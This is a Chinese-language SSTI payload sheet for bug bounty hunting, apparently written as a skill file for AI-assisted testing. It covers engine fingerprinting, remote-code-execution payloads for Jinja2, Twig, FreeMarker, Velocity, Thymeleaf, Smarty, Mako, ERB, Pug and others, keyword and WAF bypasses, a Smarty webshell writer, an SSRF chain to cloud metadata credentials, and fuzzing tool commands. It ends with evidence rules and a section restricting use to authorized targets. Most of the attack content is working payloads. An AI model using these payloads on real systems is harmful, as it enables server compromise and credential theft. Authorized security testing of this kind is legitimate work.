# 服务端模板注入（SSTI）

> 把「用户输入」当「模板指令」在服务端执行，通常直达 RCE。SSTI 是 Python/Ruby/PHP/Java 栈最容易的 RCE 路径——模板语言天然暴露运行时。Bug Bounty 中 SSTI 检出容易、赏金高（$2K–$8K，见 hunt-ssti）[Claude-BugHunter]。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（Jinja2/FreeMarker/Velocity/Thymeleaf/Smarty/Mako/Tornado/Django/ERB/Pug 十引擎）
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)（源自 SnailSploit/offensive-checklist）
- 权威公开源：PayloadsAllTheThings / PortSwigger / HackTricks

---

## 1. 触发信号

- 用户输入被拼进模板字符串后渲染（`render_template_string('Hello '+name)`、邮件模板、PDF/报表生成、CMS 预览、带用户输入的错误页）
- 输入 `{{7*7}}` 回显 `49` 而非原文 = 服务端求值（区别于客户端 XSS）
- 报错回显引擎指纹：`jinja2` / `Twig\` / `freemarker` / `mako.exceptions` 等栈信息
- 输入模板语法字符后输出空白 / 缺一段（payload 被处理了但无输出）

## 2. 高频入口点

`[Claude-BugHunter]`：姓名/简介/描述字段、邮件模板、发票抬头、PDF 生成器、URL 路径参数、搜索结果回显、被回显的 HTTP 头。

`[Claude-Red]`：URL 参数、POST body、HTTP 头（Referer/User-Agent/自定义头）、JSON key/value。

**CMS「模板编辑器」形态**（PortSwigger「SSTI using documentation」类）：登录后的模板编辑器，POST 回 `?productId=N`（id 在 query 而非 body），body 只带 `csrf`+`template`+`template-action=preview|save`。三件事：先指纹再打 RCE、id 留在 query、每次取新 CSRF 且用 `preview` 快速迭代、`save` 后才触发正式渲染。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **算术探针定位引擎**：`{{7*7}}` / `${7*7}` / `#{7*7}` / `<%= 7*7 %>` / `*{7*7}` 看哪个算成 `49`（映射见 4.1）。
2. **区分引擎**：`{{7*'7'}}` → Jinja2 得 `7777777`（字符串重复）、Twig 得 `49`（数字强转）。
3. **指纹二次确认**：Jinja2 `{{config}}`/`{{self}}`；FreeMarker `${.version}`；Smarty `{$smarty.version}`；Django `{{settings.SECRET_KEY}}`。
4. **直接上 RCE**（不要停在算术）：Jinja2 优先，失败换 Twig，再失败才回退到算术指纹。
5. **评估升级**：确认 RCE 后只拿最小证据（`id`/`whoami`），不落 shell 不持久化。

> 注意 `[Claude-BugHunter]`：JSON body 对表单端点无效——传统表单用 `application/x-www-form-urlencoded` 提交，`request.form['field']` 读不到 JSON。

## 4. Payload 区（每条标注出处）

### 4.1 引擎指纹探测 `[Claude-BugHunter]`

```
{{7*7}}       → 49 = Jinja2 / Twig
${7*7}        → 49 = FreeMarker / Velocity / Mako
<%= 7*7 %>    → 49 = ERB (Ruby)
*{7*7}        → 49 = Thymeleaf (Spring)
{{7*'7'}}     → 7777777 = Jinja2；49 = Twig
```

通用 polyglot 一次打所有引擎 `[Claude-Red]`：`${{<%[%'"}}%\`。补充 `[本地 src-hunter]`：`#{7*7}` → 49 = Pug/Jade；Smarty `{7*7}`；`[[${7*7}]]` 也测 Thymeleaf。

### 4.2 Jinja2（Python/Flask，优先打）`[本地 src-hunter]`

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}   # 下标随版本浮动
```

更多变体 `[Claude-Red]`：
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evil','w').write('hello') }}   # 写文件证明
# 无引号/无下划线：经 attr+hex 链
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
```

WAF/关键字绕过 `[本地 src-hunter]`：字符串拼接 `{{''['__cla'+'ss__']}}`；`attr` 过滤器 `{{''|attr('__cla'+'ss__')}}`；十六进制 `{{''|attr('\x5f\x5fcla\x5f\x5fss')}}`；经 request 传属性名 `{{request|attr(request.args.a)}}&a=__class__`。

进阶（Claude-Red 收录，源自 HackTricks/PayloadsAllTheThings）`[Claude-Red]`：
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
```

### 4.3 Twig / FreeMarker / Velocity / Thymeleaf / Smarty（Java/PHP 系）`[本地 src-hunter]`

**Twig（PHP/Symfony）** `[Claude-BugHunter]`：
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**FreeMarker**：
```java
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}
```

**Velocity**：`#set($x=7*7)$x`；`$class.inspect("java.lang.Runtime")`；`#set($rt=$class.inspect("java.lang.Runtime")) #set($ex=$rt.getRuntime().exec("id")) $ex.waitFor()`。

**Thymeleaf（Spring）**：`${T(java.lang.Runtime).getRuntime().exec("id")}`；`${new java.lang.ProcessBuilder(new String[]{"id"}).start()}`。

**Smarty**：`{$smarty.version}`；`{system("id")}`；`{passthru("id")}`；写 shell（仅授权）`{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}`。

### 4.4 其他引擎速查 `[本地 src-hunter]`

**Mako**：`${self.module.cache.util.os.popen("id").read()}`。
**Tornado**：`{% import os %}{{os.popen("id").read()}}`。
**Django**（默认沙箱，难直接 RCE）：`{{settings.SECRET_KEY}}` / `{{settings.DATABASES}}` 泄露敏感配置；RCE 需对象链。
**ERB（Ruby）** `[Claude-BugHunter]`：`<%= \`id\` %>`；另有 `<%= system("id") %>`、`<%= File.open('/etc/passwd').read %>` `[本地 src-hunter]`。
**Pug/Jade（Node）**：`#{process.env}`；`#{require("child_process").execSync("id").toString()}`。
**Node 泛型（EJS/Pug/Handlebars）** `[Claude-Red]`：`{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}`。

### 4.5 Bypass 要点 `[Claude-Red]`

- 字符黑名单：`attr()` 替代点号、`request['application']` 替代属性访问、`'\x5f\x5fglobals\x5f\x5f'` 替代下划线；属性名经 `request.args` 传 `?c=__class__`。
- 关键字过滤：拼接 `'o'+'s'`；`{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}`。
- 无引号：`{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}`。
- 下标浮动：`subprocess.Popen` 索引在 CPython 3.11/3.12 不同——运行时枚举 `__subclasses__()`，别硬编码。

### 4.6 引擎指纹速查（2024–2025 补充）`[Claude-Red]`

| 引擎 | 指纹 | 简单 RCE / 信息 payload |
|---|---|---|
| Mako (Python) | 报错含 `mako.exceptions` | `${self.module.os.popen('id').read()}` |
| Blade (Laravel 11) | `Undefined variable` / `@dd($loop)` | `{!!\Illuminate\Support\Facades\Artisan::call('about')!!}` |
| Groovy/GSP | `groovy.text.SimpleTemplateEngine` | `<% Class.forName('java.lang.Runtime').runtime.exec('id') %>` |
| EJS/Pug (Node) | `.ejs` `.pug` | 经 helper/原型链到 `Function`/`require` |
| Nunjucks (Node) | Mozilla 的 Jinja2 移植，`.njk` | 原型链到 `Function` 或 `require` |
| Handlebars (Node) | `{{this}}` `{{@root}}` | 需 unsafe helper 或原型污染 |
| Thymeleaf 3.1+ (Java) | `th:text="${...}"`、Spring Boot 栈 | `${T(java.lang.Runtime).getRuntime().exec('id')}`（SpEL 开启时）|
| ASP.NET Razor | `@(1+2)` → `3` | `@System.Diagnostics.Process.Start("cmd.exe","/c whoami")` |
| Go text/template | 暴露了方法才危险 | `{{ .System "ls" }}`（html/template 更安全）|

**近两年 CVE 参考** `[Claude-Red]`：CVE-2024-22195 Jinja2 sandbox/`xmlattr` filter 绕过（修于 3.1.3）；CVE-2024-46507 Yeti 平台 SSTI→RCE（修于 1.6.2）；2024 年 Atlassian Confluence widgets / CrushFTP / HFS 均有 Critical 级 SSTI。

### 4.7 各引擎绕过 / 信息收集补充 `[本地 src-hunter]`

```java
/* FreeMarker 字符串拼接绕过 */
<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}
/* Thymeleaf 反射 + 字节数组（绕关键字） */
${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
```

```php
/* Smarty 变量赋值绕过 */
{assign var="cmd" value="id"}{system($cmd)}
```

```python
/* Mako getattr / __import__ 绕过 */
${getattr(__import__("os"),"popen")("id").read()}
/* ERB 反引号 / %x / Open3 */
<%= `id` %>
<%= %x{whoami} %>
```

```js
/* Pug 经 global 链 */
#{global.process.mainModule.require("child_process").execSync("id").toString()}
```

**通用变量探测** `[Claude-Red]`：`{{config}}` `{{settings}}` `{{app.request.server.all|join(',')}}` `{$smarty.version}` `{% debug %}`（Jinja2 需 debug 扩展）。

**链式思路** `[Claude-BugHunter]`：①沙箱 Jinja2 无转义 → 同点注入 `<script>` 变存储 XSS；②引擎暴露 URL fetch filter 先于运行时 → Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` 得 SSRF→云凭据；③上传 DOCX 含 `${T(java.lang.Runtime).getRuntime().exec("id")}` → Velocity/Freemarker 邮件合并 RCE。

## 5. 工具用法

```bash
# 批量参数 fuzz（waybackurls + qsreplace + ffuf）[Claude-Red]
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/ -mr "ssti81"

# 专用工具 [Claude-Red]
python3 sstimap.py -u "https://example.com/page?name=John" -s      # SSTImap
python tplmap.py -u 'http://www.target.com/page?name=John*'        # tplmap
tinja url -u "http://example.com/?name=Kirlia"                     # TInjA

# 扫描/静态 [Claude-Red]
nuclei -t templates/ssti-* -u https://target.com
semgrep --config "p/...  # ssti rulesets
```

Burp 插件：Template Injector（维护分支）、Server Side Template Injection 主动扫描、Param Miner 挖隐藏参数。

## 6. 证据要求

**「已确认」必须满足**：命令输出（`uid=N(user) gid=...`）出现在响应中即证明 RCE——格式无关（`<div>`/`<pre>` 包裹也算），内容是证据 `[Claude-BugHunter]`。仅 `{{7*7}}→49` 在沙箱引擎内算 Medium SSTI，不是 Critical RCE——必须 `id` 或 OOB DNS 回调带唯一标记才升级 `[Claude-BugHunter]`。

**PoC 模板**：完整 HTTP 请求（含 `Content-Type: application/x-www-form-urlencoded`）+ 响应中的 `id` 输出截图 + 引擎指纹截图；保存 `{{7*7}}→49` 与 RCE 两步的请求/响应。

**CVSS 参考**：未认证 RCE `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8`；需认证模板编辑器 RCE `PR:L = 8.8`；仅信息泄露（`{{config}}`/`{{settings.SECRET_KEY}}`）`C:L = 5.3`。

**无副作用 PoC 建议** `[Claude-Red]`：`touch ssti_poc_by_YOUR_NAME.txt` 代替真实命令，证明文件系统写即可。

## 7. 合规边界 / 不要做的事

- **禁**：反弹 shell / 写 webshell / 落持久化后门——「证明能执行」用 `id`/`whoami`/`touch` 即可。
- **禁**：`cat /etc/passwd` 之外去 dump 数据库、读源码整文件、读 `/etc/shadow`、读 `.env` 里的真实密钥。
- **禁**：读到的 `SECRET_KEY` / 环境变量在报告全文展示——脱敏到 head/tail。
- **最小数据原则**：每类文件只读一行样本；RCE 只执行一次只读命令。
- **授权前提**：模板编辑器类（需登录后台）的利用，仅限授权目标。
